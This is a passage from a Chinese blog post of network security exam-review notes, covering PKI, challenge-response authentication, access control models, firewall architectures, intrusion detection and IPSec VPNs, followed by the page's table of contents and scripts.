<p>公钥基础设施 PKI(Public Key Infrastructure)：以<strong>公钥算法</strong>为中心的密钥管理体系，能提供公钥加密和数字证书服务，<strong>采用证书管理公钥</strong>，通过可信任第三方 CA (Ctificate Authority) 把用户<strong>公钥</strong>和用户的<strong>其他标识信息</strong>(比如 e-mail、身份证等)捆绑在一起。</p>
<ul>
<li>
<p>当进行安全通信时，发送方只需要得到接收方公钥的一个拷贝。</p>
</li>
<li>
<p>公钥一般以<strong>数字证书</strong>的方式存在，由 CA 签署。</p>
</li>
<li>
<p>CA 集中管理用户的公钥、过期时间和其他数字证书中包含的信息。</p>
</li>
</ul>
<p>用户获得公钥的方式：</p>
<ul>
<li>
<p>轻量目录访问协议(Lightweight Directory Access Protocol, LDAP): 最常用，可从证书库<strong>获得数字证书</strong>和<strong>数字证书作废列表</strong>(Certificate Revocation Lists, CRLs).</p>
</li>
<li>
<p>S/MIME(Secure/Multipurpose Internet Mail Extension，增强安全邮件协议)协议：在用户之间交换密钥。</p>
</li>
</ul>
<p>用户得到接收方的数字证书以后，就可以使用该公钥加密消息，发送给对方。对方只有具备响应的私钥，才能把加密消息打开。</p>
<p>对方可以把要发送的消息用私钥<strong>签名</strong>，拥有他的数字证书的用户能对消息进行验证。</p>
<h3 id="挑战响应机制">挑战响应机制</h3>
<p>基于挑战/应答属于密码鉴别的一种。特定是密码不在网络上传输。该认证机制中认证者（服务器）每次向被认证者（客户端）发送一个不同的<strong>挑战</strong>字串，客户端收到这个<strong>挑战</strong>字串后，按照双方事先协商好的方法应答。挑战相当于咨询，应答相当于回答。</p>
<ol>
<li>客户端向服务器端发错请求，要求进行身份验证。</li>
<li>服务器从数据库中查找用户名是否合法，若不合法则不做处理</li>
<li>服务器产生一个<code>挑战</code>随机数，发给客户端，作为<code>提问</code>。</li>
<li>客户端使用<code>用户名</code>+H（以共享密钥+挑战） 做应答。</li>
<li>服务器收到应答和自己计算的比较，相等则认证通过，反之则失败。</li>
<li>服务器挑战客户端成功还是失败。</li>
</ol>
<p>之后客户端不定时发送认证请求。</p>
<h2 id="0x0a-访问控制">0x0A 访问控制</h2>
<h3 id="概念-2">概念</h3>
<p>访问控制 (Access Control) 在身份认证的基础上，依据授权对提出的资源访问请求加以控制。对机密性、完整性起直接作用，是针对越权使用资源的防御措施。</p>
<h3 id="常见策略模型">常见策略模型</h3>
<ul>
<li>
<p><strong>自主访问</strong>控制 (Discretionary Access Control, DAC)</p>
</li>
<li>
<p><strong>强制型访问</strong>控制 (Mandatory Access Control, MAC)</p>
</li>
<li>
<p>基于<strong>角色</strong>的访问控制 (Role-Based Access Control, RBAC)</p>
</li>
<li>
<p>基于<strong>属性</strong>的访问控制 (Attribute-Based Access Control, ABAC)</p>
</li>
</ul>
<h3 id="访问控制机制">访问控制机制</h3>
<p>常见的访问控制机制包括：</p>
<ul>
<li>
<p>访问控制列表 <code>ACL</code> (Access Control Lists, ACL)</p>
</li>
<li>
<p>能力表</p>
</li>
<li>
<p>锁与钥匙</p>
</li>
<li>
<p>保护环</p>
</li>
</ul>
<p>* 访问控制的基本原则：</p>
<ol>
<li><strong>最小特权</strong>原则 (Least Privilege)</li>
</ol>
<p>给予主体必不可少的特权，只给主体必不可少的特权。</p>
<ol start="2">
<li><strong>多人负责</strong>原则</li>
</ol>
<p>授权分散化，使得没有独立个体拥有重要密钥的完整拷贝。</p>
<ol start="3">
<li><strong>职责分离</strong>原则</li>
</ol>
<p>将不同的责任分配给不同的人员互相牵制，消除一个人执行两项不相容任务的风险。</p>
<h3 id="计算机安全形式化模型">计算机安全形式化模型</h3>
<ol>
<li>
<p>机密性安全策略 Bell-LaPadula 模型（<strong>不上读、不下写</strong> -&gt; 机密性）</p>
</li>
<li>
<p>完整性安全策略 Biba 模型（<strong>不下读、不上写</strong> -&gt; 完整性）</p>
</li>
</ol>
<h2 id="0x0b-防火墙与入侵检测">0x0B 防火墙与入侵检测</h2>
<h3 id="防火墙基本原理">防火墙基本原理</h3>
<figure data-type="image" tabindex="36"><img src="https://3nd.xyz/post-images/move/2019-12-10-16-28-26.png" alt="" loading="lazy"></figure>
<p>防火墙 (Firewall) 是位于两个（或多个）网络间实施<strong>网间访问控制</strong>的组件的集合。</p>
<ul>
<li>
<p>内网和外网的所有数据流必须经过防火墙。</p>
</li>
<li>
<p>只有符合安全策略的数据流才能通过防火墙。</p>
</li>
<li>
<p>防火墙自身对渗透 (Pentration) 是免疫的。</p>
</li>
</ul>
<p>实现数据流控制通过预先设定的<strong>安全规则</strong>来实现。</p>
<p>安全规则由<strong>匹配条件</strong>和<strong>处理方式</strong>两部分组成：</p>
<ul>
<li>如果满足某种条件，将执行某种操作(Accept、Reject、Drop)。</li>
<li>规则根据组织的<strong>访问控制策略</strong>来制定。</li>
</ul>
<p><strong>* 两种基本策略：</strong></p>
<ol>
<li><strong>默认允许</strong>原则</li>
</ol>
<p>没有明确禁止的都是允许的。</p>
<ol start="2">
<li><strong>默认拒绝</strong>原则</li>
</ol>
<p>没有明确允许的都是禁止的。</p>
<h3 id="防火墙技术分类">防火墙技术分类</h3>
<ol>
<li>包过滤防火墙 (Packet Filtering)</li>
</ol>
<p>工作在网络层和传输层，设定访问控制列表 ACL (Access Control List)，检查所有通过的数据包，并按照给定的规则进行访问控制和过滤。</p>
<p>* Remark：包过滤规则按<strong>一定顺序</strong>存储。</p>
<ul>
<li>
<p>静态包过滤防火墙</p>
</li>
<li>
<p>动态包过滤防火墙（状态检测防火墙）</p>
<p>跟踪连接状态（序列号），并根据需要可动态的在过滤规则中增加和更新条目。</p>
</li>
</ul>
<ol start="2">
<li>代理技术</li>
</ol>
<p>通过在主机上运行<code>代理服务程序</code>，直接对特定的应用层进行服务，因此也称为<strong>应用型防火墙/应用级网关</strong>，能够完全控制网络信息的交换，控制会话过程。</p>
<ul>
<li>应用层代理（应用网关、代理服务器）<br>
<img src="https://3nd.xyz/post-images/move/2019-12-10-16-49-30.png" alt="" loading="lazy"></li>
<li>电路级代理（<code>NAT</code>）<br>
监控受信任的客户或服务器与不受信任的主机间的 TCP 握手信息，以决定会话是否合法。<br>
支持网络地址转换(NAT, Network Address Translation)，一种将私有 IP 地址转化为合法广域网 IP 地址的转换技术，被广泛使用。</li>
</ul>
<ol start="3">
<li>混合型防火墙</li>
</ol>
<h3 id="防火墙的配置方案">防火墙的配置方案</h3>
<ol>
<li><strong>屏蔽路由器</strong></li>
</ol>
<p>最简单的防火墙配置方案，直接在内网和外网之间加装一个包过滤路由器或应用网关。</p>
<ol start="2">
<li><strong>双宿主机</strong>(Dual-Homed Host)模式</li>
</ol>
<p><img src="https://3nd.xyz/post-images/move/2019-12-10-20-56-53.png" alt="" loading="lazy"><br>
双宿主机即拥有两个网络接口的计算机。采用主机代替路由器执行安全控制功能，类似于包过滤防火墙，是外部用户进入内部网络的唯一通道。<br>
双宿主机用两个网络适配器分别连接两个网络，又称<strong>堡垒主机</strong>。堡垒主机运行防火墙软件，可转发数据，提供服务等。<br>
* 堡垒主机(Bastion Host)是一种被强化的可以防御进攻的计算机，作为进入内部网络的一个检查点，以达到把整个网络的安全问题集中在某个主机上解决，从而省时省力，不用考虑其它主机的安全的目的。</p>
<ol start="3">
<li><strong>屏蔽主机</strong>模式<br>
<img src="https://3nd.xyz/post-images/move/2019-12-10-21-08-14.png" alt="" loading="lazy"><br>
包过滤<strong>路由器</strong>连接外网，堡垒主机装在内网。过滤路由器是否配置正确是安全与否的关键。</li>
</ol>
<ul>
<li>在路由器上设置过滤规则，并使堡垒主机成为从外网唯一可直达的主机，确保内网不受未被授权的外部用户的攻击。</li>
<li>实现了网络层和应用层的安全，比单独的包过滤或应用网关更安全。</li>
</ul>
<ol start="4">
<li><strong>屏蔽子网</strong>模式</li>
</ol>
<figure data-type="image" tabindex="37"><img src="https://3nd.xyz/post-images/move/2019-12-10-21-08-42.png" alt="" loading="lazy"></figure>
<p>比较流行的一种结构，采用两个包过滤器和一个堡垒主机，在内外部网络建立一个被隔离的子网，成为 DMZ (非军事区、隔离区，demilitarized zone)</p>
<p><code>DMZ</code>: 未解决安装防火墙后<strong>外网不能访问内网服务器</strong>的问题而设立的一个非安全系统与安全系统之间的缓冲区，位于企业内部网络和外部网络之间的小型网络区域内，放置一些必须公开的服务器设施，比如企业 Web 服务器、FTP 服务器等。</p>
<figure data-type="image" tabindex="38"><img src="https://3nd.xyz/post-images/move/2019-12-10-21-13-44.png" alt="" loading="lazy"></figure>
<p>* 防火墙的主要功能：</p>
<ol>
<li>
<p>网络安全的屏障</p>
</li>
<li>
<p>强化网络安全策略</p>
</li>
<li>
<p>对网络存取和访问进行监控审计</p>
</li>
<li>
<p>放置内部信息的外泄</p>
</li>
</ol>
<h3 id="入侵检测工作原理">入侵检测工作原理</h3>
<p>入侵检测系统 (Intrusion Detection System, IDS)，是一种能对潜在的入侵行为作出记录和预测的<strong>智能化、自动化的软件或硬件系统</strong>。作为一种<strong>主动防御技术</strong>，是传统计算机安全机制的<strong>重要补充</strong>。</p>
<p>主要通过<strong>监控</strong>网络、系统的状态、行为以及系统的使用情况，来<strong>检测</strong>系统用户的越权使用以及系统外部的入侵者利用系统的安全缺陷对系统进行入侵的企图。</p>
<h3 id="入侵检测分类">入侵检测分类</h3>
<ol>
<li>按照分析方法</li>
</ol>
<ul>
<li>
<p><strong>异常</strong>检测模型(Anormal Detection)<br>
首先总结正常操作具有的特征（用户轮廓），当用户活动与正常行为有重大偏离时即被认为是入侵。</p>
</li>
<li>
<p><strong>误用</strong>检测模型(Misuse Detection)<br>
收集非正常操作的行为特征，建立相关特征库。当监测的用户或系统行为与库中的记录匹配时，就认为是入侵，也称<strong>特征检测(Signature Detection)</strong>、模式发现。</p>
</li>
</ul>
<ol start="2">
<li>根据数据来源</li>
</ol>
<ul>
<li>
<p><strong>基于主机</strong>(Host-Based)的入侵检测系统, HIDS<br>
系统获取数据的依据是系统所运行的主机，保护的目标也是系统运行所在的主机，一般读取主机的日志文件发出警告。</p>
</li>
<li>
<p><strong>基于网络</strong>(Network-Based)的入侵检测系统，NIDS<br>
系统获取的数据为网络传输的数据包，保护的是网络的运行，将网卡监听设置为混杂模式，并在攻击穿越网络时对其进行监听。</p>
</li>
<li>
<p>混合型</p>
</li>
</ul>
<h2 id="0x0c-vpn">0x0C VPN</h2>
<h3 id="vpn-的概念">VPN 的概念</h3>
<p>虚拟专用网(Virtual Private Network, VPN) 是在公共网络上传输私有通信的方法。VPN 通常使用（<strong>加密</strong>的）<strong>隧道</strong>将两个或多个专用网络连接起来。</p>
<h3 id="vpn-的分类">VPN 的分类</h3>
<ol>
<li>按是否采用加密技术</li>
</ol>
<ul>
<li>
<p>加密 VPN<br>
采用数据加密实现通信安全(IPSec、SSL)。</p>
</li>
<li>
<p>非加密 VPN<br>
使两个或多个专用网络连接起来，以便用户可以在各自的网络中无缝地访问资源(GRE、MPLS 多协议标签交换)。</p>
</li>
</ul>
<ol start="2">
<li><code>Site-to-site VPN</code>：企业内部 VPN、企业外部 VPN; <code>远程访问 VPN</code>(拨号 VPN, VPDN)。</li>
</ol>
<h3 id="主要隧道协议">主要隧道协议</h3>
<figure data-type="image" tabindex="39"><img src="https://3nd.xyz/post-images/move/2019-12-10-21-41-19.png" alt="" loading="lazy"></figure>
<h3 id="ipsec">IPSec</h3>
<p>IPSec 适用于构建 VPN 的一系列协议，正在成为创建 VPN 的标准。为提供<strong>加密服务</strong>而开发，支持<strong>认证、完整性、访问控制以及数据统一性</strong>。IPSec 只允许 IP 数据的封装和加密。</p>
<p><strong>主要功能</strong>：<strong>访问控制、无连接的完整性、数据源认证、防止重放攻击、机密性</strong>。</p>
<p><strong>体系结构</strong>：</p>
<figure data-type="image" tabindex="40"><img src="https://3nd.xyz/post-images/move/2019-12-10-21-46-35.png" alt="" loading="lazy"></figure>
<ol>
<li>
<p>Internet 密钥交换协议 <code>IKE</code> 提供协商安全参数和创建认证密钥等。</p>
</li>
<li>
<p>封装协议：</p>
</li>
</ol>
<ul>
<li>
<p>负载安全封装(<code>ESP</code>, Encapsulating Security Payload) 提供加密、认证和数据保护。</p>
</li>
<li>
<p>认证报头协议(<code>AH</code>, Authentication Header) 提供认证和数据保护。</p>
</li>
</ul>
<p><strong>工作模式</strong>：</p>
<figure data-type="image" tabindex="41"><img src="https://3nd.xyz/post-images/move/2019-12-10-22-00-08.png" alt="" loading="lazy"></figure>
<ol>
<li><strong>传输模式</strong>(Transpot Mode)</li>
</ol>
<p>两台主机之间（点到点）传递的数据加密。</p>
<ol start="2">
<li><strong>隧道模式</strong>(Tunnel Mode)</li>
</ol>
<p>两个不同网段（站点到站点）所传送的数据内容的加密或者两个私有 IP 网段穿越 Internet 连接。</p>
<p><strong>工作流程</strong>：</p>
<figure data-type="image" tabindex="42"><img src="https://3nd.xyz/post-images/move/2019-12-10-22-03-36.png" alt="" loading="lazy"></figure>
<p><strong>* ComyDream 的总结：<a href="https://comydream.github.io/2018/11/27/network-security-review/">网络安全复习笔记</a>.</strong></p>

                  </div>
                  <div class="toc-container">
                    <div style="position: sticky;
                    top: 20px;">
                    <ul class="markdownIt-TOC">
<li>
<ul>
<li><a href="#0x01-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA">0x01 网络安全概论</a>
<ul>
<li><a href="#%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9A%84%E5%A8%81%E8%83%81%E6%9D%A5%E6%BA%90">网络安全的威胁来源</a></li>
<li><a href="#cia-%E4%B8%89%E5%85%83%E7%BB%84%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E6%9C%AC%E9%9C%80%E6%B1%82">CIA 三元组与网络安全基本需求</a></li>
<li><a href="#%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B">网络攻击类型</a></li>
<li><a href="#osi-%E5%AE%89%E5%85%A8%E4%BD%93%E7%B3%BB">OSI 安全体系</a></li>
<li><a href="#%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E5%88%B6%E5%BA%A6">等级保护制度</a></li>
</ul>
</li>
<li><a href="#0x02-%E9%BB%91%E5%AE%A2%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95">0x02 黑客攻击流程 &amp; 渗透测试</a>
<ul>
<li><a href="#%E9%BB%91%E5%AE%A2%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B">黑客攻击流程</a></li>
<li><a href="#%E8%B8%A9%E7%82%B9">踩点</a></li>
<li><a href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%AD%A5%E9%AA%A4">渗透测试步骤</a></li>
</ul>
</li>
<li><a href="#0x03-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E6%9F%A5%E7%82%B9%E6%8A%80%E6%9C%AF">0x03 网络扫描与查点技术</a>
<ul>
<li><a href="#%E6%89%AB%E6%8F%8F%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4">扫描的基本步骤</a></li>
<li><a href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%9A%84%E7%B1%BB%E5%9E%8B">端口扫描的类型</a></li>
<li><a href="#%E6%89%AB%E6%8F%8F%E7%9A%84%E9%98%B2%E5%BE%A1">扫描的防御</a></li>
</ul>
</li>
<li><a href="#0x04-%E5%8F%A3%E4%BB%A4%E7%A0%B4%E8%A7%A3%E4%B8%8E%E9%98%B2%E5%BE%A1">0x04 口令破解与防御</a>
<ul>
<li><a href="#%E5%B8%B8%E7%94%A8%E7%9A%84%E5%8F%A3%E4%BB%A4%E7%A0%B4%E8%A7%A3%E6%96%B9%E6%B3%95">常用的口令破解方法</a></li>
<li><a href="#windows-%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8">Windows 口令安全</a>
<ul>
<li><a href="#security-account-manager">Security Account Manager</a></li>
<li><a href="#lan-manager">LAN Manager</a></li>
<li><a href="#nt-lan-manager-v2">NT LAN Manager v2</a></li>
<li><a href="#%E7%99%BB%E5%BD%95%E4%B8%8E%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81">登录与身份认证</a></li>
</ul>
</li>
<li><a href="#linux-%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8">Linux 口令安全</a></li>
<li><a href="#%E5%8F%A3%E4%BB%A4%E7%A0%B4%E8%A7%A3%E7%9A%84%E9%98%B2%E5%BE%A1">口令破解的防御</a></li>
</ul>
</li>
<li><a href="#0x05-%E6%AC%BA%E9%AA%97%E6%8A%80%E6%9C%AF%E4%B8%8E%E9%98%B2%E5%BE%A1">0x05 欺骗技术与防御</a>
<ul>
<li><a href="#arp-%E6%AC%BA%E9%AA%97">ARP 欺骗 📌</a></li>
<li><a href="#ip-%E6%AC%BA%E9%AA%97">IP 欺骗 📌</a></li>
<li><a href="#dns-%E6%AC%BA%E9%AA%97">DNS 欺骗</a></li>
<li><a href="#%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E6%AC%BA%E9%AA%97%E4%B8%8E%E9%82%AE%E4%BB%B6%E5%AE%89%E5%85%A8pgp">电子邮件欺骗与邮件安全（PGP）</a></li>
</ul>
</li>
<li><a href="#0x06-web-%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1">0x06 Web 攻击与防御 📌</a>
<ul>
<li><a href="#sql-%E6%B3%A8%E5%85%A5">SQL 注入</a></li>
<li><a href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB-xss">跨站脚本攻击 XSS</a></li>
<li><a href="#%E5%85%B6%E4%BB%96%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B">其他攻击类型</a></li>
</ul>
</li>
<li><a href="#0x07-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1">0x07 缓冲区溢出攻击与防御</a>
<ul>
<li><a href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86">缓冲区溢出原理</a></li>
<li><a href="#%E6%A0%88%E6%BA%A2%E5%87%BA">栈溢出 📌</a></li>
<li><a href="#%E5%85%B6%E4%BB%96%E6%BA%A2%E5%87%BA%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86">其他溢出的工作原理</a></li>
<li><a href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E7%9A%84%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD">缓冲区溢出的防御措施</a></li>
</ul>
</li>
<li><a href="#0x08-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB">0x08 拒绝服务攻击</a>
<ul>
<li><a href="#%E6%A6%82%E5%BF%B5">概念</a></li>
<li><a href="#%E5%88%86%E7%B1%BB">分类</a></li>
<li><a href="#ddos-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86">DDoS 工作原理</a></li>
<li><a href="#%E9%98%B2%E5%BE%A1">防御</a></li>
</ul>
</li>
<li><a href="#0x09-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81">0x09 身份认证</a>
<ul>
<li><a href="#aaa">AAA</a></li>
<li><a href="#%E5%B8%B8%E7%94%A8%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF">常用身份认证技术</a></li>
<li><a href="#kerberos-%E5%8D%8F%E8%AE%AE">Kerberos 协议</a></li>
<li><a href="#pki-%E5%8E%9F%E7%90%86">PKI 原理</a></li>
<li><a href="#%E6%8C%91%E6%88%98%E5%93%8D%E5%BA%94%E6%9C%BA%E5%88%B6">挑战响应机制</a></li>
</ul>
</li>
<li><a href="#0x0a-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6">0x0A 访问控制</a>
<ul>
<li><a href="#%E6%A6%82%E5%BF%B5-2">概念</a></li>
<li><a href="#%E5%B8%B8%E8%A7%81%E7%AD%96%E7%95%A5%E6%A8%A1%E5%9E%8B">常见策略模型</a></li>
<li><a href="#%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%9C%BA%E5%88%B6">访问控制机制</a></li>
<li><a href="#%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8%E5%BD%A2%E5%BC%8F%E5%8C%96%E6%A8%A1%E5%9E%8B">计算机安全形式化模型</a></li>
</ul>
</li>
<li><a href="#0x0b-%E9%98%B2%E7%81%AB%E5%A2%99%E4%B8%8E%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B">0x0B 防火墙与入侵检测</a>
<ul>
<li><a href="#%E9%98%B2%E7%81%AB%E5%A2%99%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86">防火墙基本原理</a></li>
<li><a href="#%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF%E5%88%86%E7%B1%BB">防火墙技术分类</a></li>
<li><a href="#%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%B9%E6%A1%88">防火墙的配置方案</a></li>
<li><a href="#%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86">入侵检测工作原理</a></li>
<li><a href="#%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E5%88%86%E7%B1%BB">入侵检测分类</a></li>
</ul>
</li>
<li><a href="#0x0c-vpn">0x0C VPN</a>
<ul>
<li><a href="#vpn-%E7%9A%84%E6%A6%82%E5%BF%B5">VPN 的概念</a></li>
<li><a href="#vpn-%E7%9A%84%E5%88%86%E7%B1%BB">VPN 的分类</a></li>
<li><a href="#%E4%B8%BB%E8%A6%81%E9%9A%A7%E9%81%93%E5%8D%8F%E8%AE%AE">主要隧道协议</a></li>
<li><a href="#ipsec">IPSec</a></li>
</ul>
</li>
</ul>
</li>
</ul>

                  </div>
                  </div>
                </div>
          </article>
        </div>

        
          <div class="nearby-post" style="padding: 24px 32px;">
            <div class="prev-post" style="float: left;">
              <div class="aaa" style="
              margin-bottom: 24px;
              color: #343a40;
              font-weight: lighter;text-align: left;">上一篇</div>
              <a href="https://3nd.xyz/post/2019-12-17-RSA-Crypto-System-Study-Note/">
                <h3 class="post-title" style="text-align: left;">
                  RSA Crypto System Study Note
                </h3>
              </a>
            </div>
            <div class="next-posts" style="float: right;">
              <div class="aaa" style="
              margin-bottom: 24px;
              color: #343a40;
              font-weight: lighter; text-align: right;">下一篇</div>
              <a href="https://3nd.xyz/post/2019-11-27-Do-Evil-Things-With-Gopher/">
                <h3 class="post-title" style="
                text-align: right;">
                  Do Evil Things With Gopher://
                </h3>
              </a>
            </div>
          </div>
          

                

                                <div class="site-footer">
  
  <a class="rss" href="https://3nd.xyz/atom.xml" target="_blank">
    <i class="ri-rss-line"></i> RSS
  </a>
</div>

    </div>
  </div>

  <script>
    hljs.highlightAll();

    let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");

    // This should probably be throttled.
    // Especially because it triggers during smooth scrolling.
    // https://lodash.com/docs/4.17.10#throttle
    // You could do like...
    // window.addEventListener("scroll", () => {
    //    _.throttle(doThatStuff, 100);
    // });
    // Only not doing it here to keep this Pen dependency-free.

    window.addEventListener("scroll", event => {
      let fromTop = window.scrollY;

      mainNavLinks.forEach((link, index) => {
        let section = document.getElementById(decodeURI(link.hash).substring(1));
        let nextSection = null
        if (mainNavLinks[index + 1]) {
          nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
        }
        if (section.offsetTop <= fromTop) {
          if (nextSection) {
            if (nextSection.offsetTop > fromTop) {
              link.classList.add("current");
            } else {
              link.classList.remove("current");
            }
          } else {
            link.classList.add("current");
          }
        } else {
          link.classList.remove("current");
        }
      });
    });
  </script>
<script src="/media/view-support.js"></script>
<script>
  window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js'], function () {
    var pageview = window.pageview(AV, {
      appId: 'HRVNDkHV80Fpk9M8c5GQqjwy-gzGzoHsz',
      appKey: 'nsyqncNCSWSOkkns1wvDlUrh',
      appClass: 'Gridea',
    });
    $('.page-view').each(function () {
      var $this = $(this);
      var key = $this.attr('key');
      var title = $this.attr('title');
      pageview.increase(key, title, function(view) {
        $("[key='" + key +"']").text(view+' views');
      });
    });
  });
</script>

</body>

</html>